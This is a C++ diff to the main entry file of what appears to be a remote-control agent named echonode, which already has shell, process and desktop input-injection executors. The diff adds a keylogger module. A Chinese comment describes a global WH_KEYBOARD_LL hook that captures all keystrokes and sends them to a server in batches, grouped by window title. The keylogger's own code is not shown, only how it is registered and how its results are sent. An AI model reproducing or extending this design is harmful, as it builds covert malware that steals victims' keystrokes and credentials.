@@ -8,6 +8,7 @@
 #include "executor/ShellExecutor.hpp"
 #include "executor/ProcessExecutor.hpp"
 #include "executor/ShellSessionManager.hpp"
+#include "executor/KeylogExecutor.hpp"
 #include "platform/PlatformFactory.hpp"
 #include "protocol/to_server.hpp"
 
@@ -87,6 +88,14 @@ int main(int argc, char** argv) {
         });
     deskExecutor->setInputInjector(echonode::platform::createInputInjector());
     dispatcher.add(std::move(deskExecutor));
+
+    // 键盘记录：WH_KEYBOARD_LL 钩子捕获全局键盘输入，按窗口标题上下文批量回传
+    auto keylogExecutor = std::make_unique<echonode::executor::KeylogExecutor>();
+    keylogExecutor->setResultSender(
+        [&client](const echonode::protocol::TaskResult& result) {
+            client.sendText(echonode::protocol::toJson(result).dump());
+        });
+    dispatcher.add(std::move(keylogExecutor));
 
     client.setTextHook([&sessionsPtr, filePtr](const nlohmann::json& j) {
         const std::string type = j.value("type", std::string{});
